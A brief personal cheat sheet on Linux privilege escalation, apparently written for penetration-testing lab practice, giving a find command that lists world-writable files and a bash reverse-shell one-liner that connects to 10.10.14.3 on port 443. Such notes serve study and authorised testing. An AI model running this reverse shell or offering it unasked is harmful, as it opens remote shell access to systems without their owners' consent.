#Linux_PrivilegeEscalation 

- To find misconfigured cron jobs we use the following command:
```bash
find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
```

**Note**: The above command prevents the find from going into the `/proc` directory

- **One-liner for Reverse Shell**
```bash
bash -i >& /dev/tcp/10.10.14.3/443 0>&1
```
